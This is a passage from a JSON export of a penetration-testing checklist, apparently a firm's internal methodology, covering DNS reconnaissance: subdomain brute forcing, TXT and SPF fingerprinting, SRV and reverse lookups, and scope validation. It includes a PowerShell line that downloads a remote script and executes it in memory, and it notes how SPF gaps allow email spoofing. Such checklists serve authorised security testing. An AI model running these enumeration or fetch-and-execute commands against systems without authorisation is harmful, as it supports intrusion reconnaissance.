Copy/paste the command and output as a comment on this checklist item.</p><p>2. In the master spreadsheet being maintained, add the subdomains from this output to a new column called subfinder in a Subdomains sheet in the spreadsheet.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ca56c669-f425-42cb-b715-4f555350f170",
						"name": "Subdomains - GetAllURLs [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Review tool output for subdomains.</p><h2>Variation: GetAllURLs</h2><p>1. Download gau and build with go:</p><pre><code>$ git clone https://github.com/lc/gau.git\n$ cd gau/cmd\n$ go build\n$ sudo mv gau /usr/local/bin/</code></pre><p>Or install via go:</p><pre><code>$ go install github.com/lc/gau/v2/cmd/gau@latest</code></pre><p>Or download and run the pre-built binary:</p><pre><code>Download appropriate binary from https://github.com/lc/gau/releases/\n\n$ tar xvf gau_&lt;version&gt;_linux_amd64.tar.gz\n$ mv gau /usr/bin/gau</code></pre><p>2. Run the tool.</p><pre><code>gau --subs --threads 20 netspi.com | awk -F/ '{print $3}' | sed -e 's/:.&#42;//' -e 's/^www\\.//' | sort -u</code></pre><h3>Examples:</h3><pre><code>$ printf example.com | gau\n$ cat domains.txt | gau --threads 5\n$ gau example.com google.com\n$ gau --o example-urls.txt example.com\n$ gau --blacklist png,jpg,gif example.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "15e25493-0d05-40a2-97ca-3e1ae63fd518",
						"name": "Subdomains - Brute Forcing [ExPowerPen]",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Perform brute forcing to discover subdomains.</p><h2>Variation: dnsrecon</h2><p>1. Run command commands to identify subdomains.</p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml</code></pre><p>or</p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt -n [name server ip] --threads 15 --xml /path/to/file.xml</code></pre><h2>Variation: amass</h2><p>1. Install amass via apt.</p><pre><code>sudo apt install amass</code></pre><p>2. Run the following command.</p><pre><code>amass enum -brute [-w wordlist] -d netspi.com</code></pre><h2>Variation: gobuster</h2><p>1. Install gobuster via apt.</p><p>2. Run the following command.</p><pre><code>gobuster dns -d netspi.com -w wordlist -t 20</code></pre><h2>Dealing with wild card records</h2><p>When a brute force is performed against a domain using a wildcard record every request is going to come back as successful, either with a real result or that of the default record. Below is a summary of how to deal with it.</p><p>1. Determine wildcard exists by querying for a long random subdomain.  If A records are returned then a wildcard record is most likely being used.</p><pre><code>dig adsfadfasdfasdf.domain.com</code></pre><p>2. Conduct DNS brute forcing of the domain, but filter out the wildcard IP addresses from the results to obtain a list of real sub domains.</p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml</code></pre><p>3. Fiter out results known wild card servers</p><pre><code>grep -v &quot;wildcardip1&quot; file.xml | grep -v &quot;wildcardip2&quot; | grep -v &quot;wildcardip3&quot; </code></pre><p><strong>Reference:</strong> https://digi.ninja/blog/dns_wildcard_recon.php</p><h2><strong>Report Requirements</strong></h2><ul><li><p>Record newly discovered domain names for later targeting.</p></li><li><p>For the task also show the command and a truncated version of the output to illustrate the attack process.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063352,
							"uid": "13b9c284-5f3e-e811-80fe-ecf4bbd04073",
							"name": "General Information - DNS - Sub Domain Brute Forcing",
							"description": "<p>It was possible to identify sub domains using common brute force techniques.</p>",
							"severityId": -2,
							"businessImpact": "<p>It may be possible to target discovered subdomains in future attacks.</p>",
							"sourceIdentifier": "M:0b82feff-7d51-40b1-a335-22f812994087",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>Perform brute forcing to discover subdomains.</p><p>1. Run command commands to identify subdomains.</p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml</code></pre><p>or </p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt -n [name server ip] --threads 15 --xml /path/to/file.xml</code></pre><h2>Dealing with wild card records</h2><p>When a brute force is performed against a domain using a wildcard record every request is going to come back as successful, either with a real result or that of the default record. Below is a summary of how to deal with it.</p><p>1. Determine wildcard exists by querying for a long random subdomain.  If A records are returned then a wildcard record is most likely being used.</p><pre><code>dig adsfadfasdfasdf.domain.com</code></pre><p>2. Conduct DNS brute forcing of the domain, but filter out the wildcard IP addresses from the results to obtain a list of real sub domains.</p><pre><code>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml</code></pre><p>3. Fiter out results known wild card servers</p><pre><code>grep -v &quot;wildcardip1&quot; file.xml | grep -v &quot;wildcardip2&quot; | grep -v &quot;wildcardip3&quot; </code></pre><p>Reference: https://digi.ninja/blog/dns_wildcard_recon.php</p><p><strong>Note:  </strong>GoBuster can also do domain brute forcing pretty fast and supports wildcard domain detection.</p><p>https://github.com/OJ/gobuster</p><h2><strong>Report Requirements</strong></h2><ul><li><p>Record newly discovered domain names for later targeting.</p></li><li><p>For the task also show the command and a truncated version of the output to illustrate the attack process.</p></li></ul>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Consider processing request with a wild card domain when possible to prevent common enumeration.</p>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a9f2c532-27f1-4ad4-a710-dca0bee97b90",
						"name": "TXT Records - Domain Validation Token [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Identify third party SaaS providers being used. Sometimes they support federated/managed authentication without MFA.</p><h2>Variation: dig</h2><p>1. Use dig to query TXT records from the target domain.</p><pre><code>dig txt domain.com +short</code></pre><h3>Example:</h3><pre><code>dig txt office.com +short\n&quot;google-site-verification=zqthuNzyDukN37Znr1L5xdDKHo7KZUL2LTyOqzU7cFo&quot;\n&quot;google-site-verification=WiCZ6HhPFmPMk5PTkdpSnevgiRttL2tQ-7QA_Z81JRk&quot;\n&quot;facebook-domain-verification=h6ulkdsze2qhdtbdnivt3lilquemgc&quot;\n&quot;google-site-verification=ntjPAtTot4dDzv9Z7WpQYYSlgVajPuBZx0FoZyRE8q8&quot;\n&quot;google-site-verification=iJN6qYrMLZmqRE70EPwnmUtT7qW3Rs-X3_wgil1YQjw&quot;\n&quot;google-site-verification=V6qxrpALPrk4N8F9wqgUVMwFdKi4sSUY5dLaICCx5rU&quot;\n&quot;google-site-verification=9aqt6mNhLx_inDlQjEfPiqq_TYfy72IFpoUh5_gijEg&quot;</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17065336,
							"uid": "cf983402-c8c9-e911-8117-ecf4bbd04083",
							"name": "General Information - DNS TXT - Domain Validation Token",
							"description": "<p>Domain validation tokens appear to exist in one or more DNS TXT record.  Domain validation tokens are initially used by vendors to validate ownership of domains, but can usually be removed after that validation has occurred.</p>",
							"severityId": -2,
							"businessImpact": "<p>When domain validation tokens are not removed after being used they allow remote unauthenticated attackers to fingerprint third party services being used by the organization that could be targeted in future attacks.</p>",
							"sourceIdentifier": "M:fd7fb236-0431-4b33-b5d2-01f0114e987c",
							"verificationInstructions": "<h2>Instructions</h2><p>Attempt to identify service provider through analysis of TXT based domain authentication tokens.</p><p> 1. Load Resolve-DnsDomainValidationToken into the PowerShell session.</p><pre><code>IEX(<strong>New</strong>-Object System.Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Resolve-DnsDomainValidationToken.ps1&quot;)</code></pre><p>2. Run Resolve-DnsDomainValidationToken to collect and fingerprint TXT records</p><pre><code>$Results = Resolve-DnsDomainValidationToken -Verbose -Domain adroll.com </code></pre><p>3. View records in the console</p><pre><code>$Results</code></pre>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Remove domain validation tokens when possible.</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0ba86346-4a1a-4f5f-9590-beec35337bc1",
						"name": "TXT Records - SPF [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Verify SPF records exist for email domains, white listed IP ranges and domains cannot be hijacked.</p><p>Check for SPF records on domains being used for email to identify missed SPF records and interesting TXT records that could indicate the use of technologies that could be targeted in future attacks.</p><p><strong>Important Notes</strong></p><ul><li><p>SPF records are a type of DNS TXT record.</p></li><li><p>SPF records contains a list of internet servers allowed to send email for the domain.</p></li><li><p>SPF records can include a &quot;soft fail&quot; (~all) to indicate that IPs sending email for the domain that are not on the list should be marked as SPAM.</p></li><li><p>SPF records can include a hard fail (-all) to indicate that IPs sending email for the domain that are not on the list should be blocked.</p></li><li><p>SPF records may point to another TXT record using the &quot;include:&quot; setting.</p></li></ul><p>Clients getting mail from your domain validate the servers using your SPF records. However, they don't have to honor it.</p><p><strong>Note:</strong> As an attacker if you can obtain access to SPF IPs or relay through them you can spoof email from the domain.</p><h2>Variation: dig</h2><p>1. Use dig to identify SPF records.</p><pre><code><strong>dig txt google.com +short\n\n</strong><strong><span style=\"color: #DB2719\">&quot;v=spf1 include:_spf.google.com ~all&quot;</span></strong>\n&quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\n&quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\n&quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\n&quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\n&quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\n&quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\n&quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\n&quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;</code></pre><h2>Variation: checkdmarc</h2><p>1. Install checkdmarc.</p><pre><code>pip install checkdmarc</code></pre><p>2. Run checkdmarc against the target domain and use jq to filter for the SPF record.</p><pre><code><strong>checkdmarc google.com | jq '.spf.record'</strong>\n\n&quot;v=spf1 include:_spf.google.com ~all&quot;</code></pre><h2>Variation: dnsrecon</h2><p>1. Run dnsrecon and review the returned records.</p><pre><code><strong>dnsrecon -d google.com</strong>\n\n[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      <strong><span style=\"color: #DB2719\">TXT google.com v=spf1 include:_spf.google.com ~all</span></strong>\n[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\n<strong>[TRUNCATED]</strong></code></pre><h2><strong>Variation: nslookup</strong></h2><p>1. Use nslookup and review the returned records.</p><pre><code><strong>nslookup -type=txt google.com</strong>\n\nServer:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\ngoogle.com      text = <strong><span style=\"color: #DB2719\">&quot;v=spf1 include:_spf.google.com ~all&quot;</span></strong>\ngoogle.com      text = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\ngoogle.com      text = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\ngoogle.com      text = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\ngoogle.com      text = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\ngoogle.com      text = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\ngoogle.com      text = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\ngoogle.com      text = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\ngoogle.com      text = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n\nAuthoritative answers can be found from:</code></pre><h2>Reporting Requirements</h2><ul><li><p>Follow up on any odd TXT records to determine if related service have vulnerabilities.</p></li><li><p>Take a screen shot of the command and command output for the email domain that does not have an SPF record.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17059062,
							"uid": "e4c50f0f-506a-e611-80e5-ecf4bbd04083",
							"name": "Weak Configuration - DNS - SPF Record Not Set",
							"description": "<p>The Sender Policy Framework (SPF) is an open standard specifying a technical method to prevent sender address forgery. An SPF record is a TXT record in DNS that begins with v=spf1. It includes a list of IPs that sending domain owner has specified as permitted to send email for that domain and it also informs the recipient mail server what to do if an email is received from an IP that is not on the permitted senders list.</p><p>No SPF records appear to exist for the current domains being used for email.</p>",
							"severityId": 1,
							"businessImpact": "<p>Attackers may be able to forge emails from the internet and impersonate an email address from the affected domain.</p>",
							"sourceIdentifier": "M:e4c50f0f-506a-e611-80e5-ecf4bbd04083",
							"verificationInstructions": "<p>NOTE: WE NEED AUTOMATION TO DO THIS ON SCALE FOR ALL IDENTIFY DOMAINS, OR AT LEAST FEDERATED/MANAGED/EMAIL DOMAINS.</p><h2>Instructions</h2><p>Check for SPF records on domains being used for email to identify missed SPF records and interesting TXT records that could indicate the use of technologies that could be targeted in future attacks.</p><p><strong>Important Notes</strong></p><ul><li><p>SPF records are a type of DNS TXT record.</p></li><li><p>SPF records contains a list of internet servers allowed to send email for the domain.</p></li><li><p>SPF records can include a &quot;soft fail&quot; (~all) to indicate that IPs sending email for the domain that are not on the list should be marked as SPAM.</p></li><li><p>SPF records can include a hard fail (-all) to indicate that IPs sending email for the domain that are not on the list should be blocked.</p></li><li><p>SPF records may point to another TXT record using the &quot;include:&quot; setting.</p></li></ul><p>Clients getting mail from your domain validate the servers using your SPF records. However, they don't have to honor it.</p><p> Note: As an attacker if you can obtain access to SPF IPs or relay through them you can spoof email from the domain.</p><p><strong>Commands Options</strong></p><pre><code>dnsrecon -d domain.com -n ns1.nameserver1.com\ndnsrecon -d domain.com</code></pre><p>or</p><pre><code>dig domain.com txt host ns1.nameserver1.com\ndig microsoft.com txt</code></pre><p>or</p><pre><code>nslookup -type=TXT domain.com </code></pre><p>or</p><pre><code>Resolve-DnsName domain.com -type TXT</code></pre><p>or</p><p>checkdmarc (https://pypi.org/project/checkdmarc/) outputs SPF and DMARC records in a JSON format for a domain</p><pre><code>checkdmarc domain.com</code></pre><h2>Reporting Requirements</h2><ul><li><p>Follow up on any odd TXT records to determine if related service have vulnerabilities.</p></li><li><p>Take a screen shot of the command and command output for the email domain that does not have an SPF record.</p></li></ul><h2>Sample Output</h2><p>Below is an example of what an existing SPF record looks like:</p><pre><code><strong>dig domain.com txt host ns1.nameserver1.com</strong>\n\nv=spf1 ip4:95.59.2.21 ip4:95.59.2.22 ip4:195.168.1.0/28 mx -all </code></pre><p>Create domain with spf, associate email with it, sent to it mail server, then check if domain without spfs are still allowed...</p><pre><code><strong>Resolve-DnsName foxnews.com  -type TXT</strong>\n\nName                                     Type   TTL   Section    Strings\n----                                     ----   ---   -------    -------\nfoxnews.com                              TXT    299   Answer     {MS=ms40284671}\nfoxnews.com                              TXT    299   Answer     {qRWnq9UOByGW6DnvW8qZ4scp8GbkRYG4bsmSOyP+\n                                                                 dzlIB+XXQtkNbpBK3qVrJ8E7YT83Bk33z5CPO1L2K\n                                                                 lH/mA==}\nfoxnews.com                              TXT    299   Answer     {265947818-2009536}\nfoxnews.com                              TXT    299   Answer     {v=spf1 ip4:66.230.193.2\n                                                                 include:amazonses.com\n                                                                 include:spf-00136701.pphosted.com -all}</code></pre><p><strong>Running on multiple domains</strong></p><pre><code>cat main_domains.txt | xargs -I % sh -c &quot;echo %;dig txt % +short;echo&quot;</code></pre>",
							"references": "<ul><li>https://en.wikipedia.org/wiki/Sender_Policy_Framework</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Consider creating an SPF record for email domains configured with a HardFail to help prevent internet users from spoofing them.</p>"
						},
						"ordinal": 10,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "32b77d0e-a2a2-4464-9bfe-97f05c762823",
						"name": "SRV Records - Internal IPs [ExPowerPen]",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Enumerate common DNS records and verify no internal IP addresses are exposed.</p><p><strong>Note:</strong> C:\\Windows\\System32\\drivers\\etc\\services contains a list of common service types. If you would like to use nslookup.</p><h2><strong>Variation: dnsrecon</strong></h2><p>1. Use dnsrecon and review the SRV records returned </p><pre><code>dnsrecon -d [domain.com] -n [nameserver]</code></pre><h3>Example:</h3><pre><code>dnsrecon -d google.com\n[&#42;] std: Performing General Enumeration against: google.com...\n<strong>[TRUNCATED]</strong>\n[&#42;] Enumerating SRV Records\n[+]      SRV _ldap._tcp.google.com ldap.google.com 216.239.32.58 389\n[+]      SRV _ldap._tcp.google.com ldap.google.com 2001:4860:4802:32::3a 389\n[+]      SRV _caldav._tcp.google.com calendar.google.com 142.250.190.142 80\n[+]      SRV _caldav._tcp.google.com calendar.google.com 2607:f8b0:4009:814::200e 80\n[+]      SRV _caldavs._tcp.google.com calendar.google.com 142.250.190.142 443\n[+]      SRV _caldavs._tcp.google.com calendar.google.com 2607:f8b0:4009:814::200e 443\n[+]      SRV _carddavs._tcp.google.com google.com 142.250.191.174 443\n[+]      SRV _carddavs._tcp.google.com google.com 2607:f8b0:4009:819::200e 443\n[+]      SRV _xmpp-client._tcp.google.com alt4.xmpp.l.google.com 209.85.202.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt4.xmpp.l.google.com 2a00:1450:400b:c00::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt3.xmpp.l.google.com 64.233.186.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt3.xmpp.l.google.com 2800:3f0:4003:c00::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com xmpp.l.google.com 142.250.111.125 5222\n[+]      SRV _xmpp-client._tcp.google.com xmpp.l.google.com 2607:f8b0:4023:1401::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt1.xmpp.l.google.com 108.177.12.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt1.xmpp.l.google.com 2607:f8b0:400c:c08::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt2.xmpp.l.google.com 172.253.62.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt2.xmpp.l.google.com 2607:f8b0:4004:c07::7d 5222\n[+]      SRV _jabber._tcp.google.com alt2.xmpp-server.l.google.com 172.253.62.125 5269\n[+]      SRV _jabber._tcp.google.com alt4.xmpp-server.l.google.com 209.85.202.125 5269\n[+]      SRV _jabber._tcp.google.com alt1.xmpp-server.l.google.com 108.177.12.125 5269\n[+]      SRV _jabber._tcp.google.com xmpp-server.l.google.com 142.251.4.125 5269\n[+]      SRV _jabber._tcp.google.com alt3.xmpp-server.l.google.com 64.233.186.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt4.xmpp-server.l.google.com 209.85.202.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt3.xmpp-server.l.google.com 64.233.186.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt1.xmpp-server.l.google.com 108.177.12.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt2.xmpp-server.l.google.com 172.253.62.125 5269\n[+]      SRV _xmpp-server._tcp.google.com xmpp-server.l.google.com 142.251.4.125 5269\n[+]      SRV _jabber-client._tcp.google.com alt1.xmpp.l.google.com 108.177.12.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt1.xmpp.l.google.com 2607:f8b0:400c:c08::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt4.xmpp.l.google.com 209.85.202.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt4.xmpp.l.google.com 2a00:1450:400b:c00::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt3.xmpp.l.google.com 64.233.186.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt3.xmpp.l.google.com 2800:3f0:4003:c00::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt2.xmpp.l.google.com 172.253.62.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt2.xmpp.l.google.com 2607:f8b0:4004:c07::7d 5222\n[+]      SRV _jabber-client._tcp.google.com xmpp.l.google.com 142.250.111.125 5222\n[+]      SRV _jabber-client._tcp.google.com xmpp.l.google.com 2607:f8b0:4023:1401::7d 5222\n[+] 38 Records Found</code></pre><h2><strong>Reporting Requirements</strong></h2><ul><li><p>Record any internal IP address in the task notes</p></li><li><p>Add any new domains to the target domain list, but ensure it is hosted on an in scope system.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063349,
							"uid": "ba2388cc-5e3e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Domains - Common Type Lookups",
							"description": "<p>It was possible to enumerate common DNS records types for the affected domains.</p>",
							"severityId": -2,
							"businessImpact": "<p>Information obtained via DNS queries could be used to enumerate other assets that could be targeted in later attacks.</p>",
							"sourceIdentifier": "M:41b9522d-71b6-426e-a4e8-fa2d1210f6ba",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>Enumerate common DNS records.</p><p>Note: C:\\Windows\\System32\\drivers\\etc\\services contains a list of common service types. If you would like to use nslookup.</p><p><strong>Variation: dnsrecon </strong></p><pre><code>dnsrecon -d [domain.com]-n  [nameserver]</code></pre><p><strong>Variation: nslookup </strong></p><pre><code>nslookup -q MX domain.com</code></pre><h2><strong>Reporting Requirements</strong></h2><ul><li><p>Record any internal IP address in the task notes</p></li><li><p>Add any new domains to the target domain list, but ensure it is hosted on an in scope system.</p></li></ul>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure internal asset information is not accessible from internet exposed DNS servers. Disable DNS or ensure that name servers are not accessible from the internet when possible. Corrective actions may not be required, but it is important to be aware that DNS data can be leveraged by attackers.</p>"
						},
						"ordinal": 11,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "40066d24-dc7f-4258-98ae-a6db6f0a2b84",
						"name": "RDNS [ExPowerPen]",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Perform reverse DNS scans. This should always be done.</p><h2><strong>Variation: Nmap</strong></h2><pre><code>nmap -sL -iL hosts -oA Client-RDNS</code></pre><h2><strong>Variation: Recon-ng</strong></h2><pre><code>Recon-ng use recon/hosts-hosts/reverse_resolve, import ips</code></pre><h2><strong>Variation:  dnsrecon.py</strong></h2><p>Note: This recommendation to obtain additional DNS records from exposed name servers.</p><p>Look for name servers to target.</p><pre><code>./dnsrecon.py -d domain.com -a -z -g -w -c output.csv --threads 15 -f</code></pre><p>- Default = srv and std record lookups</p><p>-a = zone transfer attempt</p><p>-z = dnssec zonewalk through</p><p>-g  = google subdomain search</p><p>-w = full reverse look up for ranges, then lookup against range (can take a while)</p><p>-c output.csv = CSV output</p><p>--threads 15 = threading for reverse lookups</p><p>-f = wildcard defined IP Address when saving records</p><p>or</p><pre><code>dnsrecon -r 10.2.2.0/24</code></pre><h2><strong>Reporting Requirements</strong></h2><ul><li><p>Add discovery domains to target list, but ensure they resolve back to in scope IP addresses.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 16881,
							"uid": "2cf3984e-03b1-dd11-992f-001e4f120030",
							"name": "General Information - Domain Names - RDNS",
							"description": "<p>The fully qualified domain name of this host could be resolved.</p>",
							"severityId": -2,
							"businessImpact": null,
							"sourceIdentifier": "GID:1979",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>Perform reverse DNS scans. This should always be done.</p><p><strong>Variation: Nmap</strong></p><pre><code>nmap -sL -iL hosts -oA Client-RDNS</code></pre><p><strong>Variation: Recon-ng</strong></p><pre><code>Recon-ng use recon/hosts-hosts/reverse_resolve, import ips</code></pre><p><strong>Variation:  dnsrecon.py </strong></p><p>Note: This recommendation to obtain additional DNS records from exposed name servers.</p><p>Look for name servers to target.</p><pre><code>./dnsrecon.py -d domain.com a -z -g -w -c output.csv ?threads 15 -f</code></pre><p>- Default = srv and std record lookups</p><p>- -a = zone transfer attempt</p><p>- -z = dnssec zonewalk through -g  = google subdomain search </p><p>-w = full reverse look up for ranges, then lookup against range (can take a while)</p><p>--threads 15 = threading for reverse lookups</p><p> -f = wildcard defined IP Address when saving records</p><p>or </p><pre><code>dnsrecon -r 10.2.2.0/24</code></pre><h2><strong>Reporting Requirements</strong></h2><ul><li><p>Add discovery domains to target list, but ensure they resolve back to in scope IP addresses.</p></li></ul>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>This finding is informational only.</p>"
						},
						"ordinal": 12,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "71f180d5-0682-4039-a5d0-c0af7a0d374b",
						"name": "Validate Discovered Domains Resolve to in Scope IPs [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Verify all domains discovery map back to in scope IP ranges prior to the start of testing.</p><h2>Variation: DNSFilter</h2><p>DNSFilter is a python script almost identical to ClientChecker. However, it will output the hostnames that are in-scope. Possible use case is having a giant list of hostnames found during DNS recon, and instead of going one by one and removing that specific hostname, just the in-scope hosts will be returned which you can add to your Nessus/Nexpose/WI scans.</p><p>1. Download DNSFilter.</p><pre><code>https://github.com/NetSPI/Scripts-Private/blob/master/ClientChecker</code></pre><h3>Example:</h3><pre><code>python dnsfilter.py -d file of [file of hostnames] -i [file of IPs]</code></pre><p>Inscope IPs (ips.txt)</p><pre><code>10.2.21.40\n104.197.208.225\n10.2.21.2</code></pre><p>Domain Names that were enumerated (hosts.txt)</p><pre><code>correlatedvm.netspi.com\nftp.netspi.com\nabcd.netspi.com (no dns entry)\nsqlwiki.netspi.com (resolved IP not listed in in-scope IPs)</code></pre><p>Output:</p><pre><code><strong>python dnsfilter.py -i ips.txt -d hosts.txt</strong>\n\nInscope Hostnames\ncorrelatedvm.netspi.com\nftp.netspi.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 13,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a98c8966-9ced-4f94-919d-ec1fa864d205",
						"name": "Validate Discovered Domains Resolve to in Scope IPs - Remove Out of Scope Domains [ExPowerPen]",
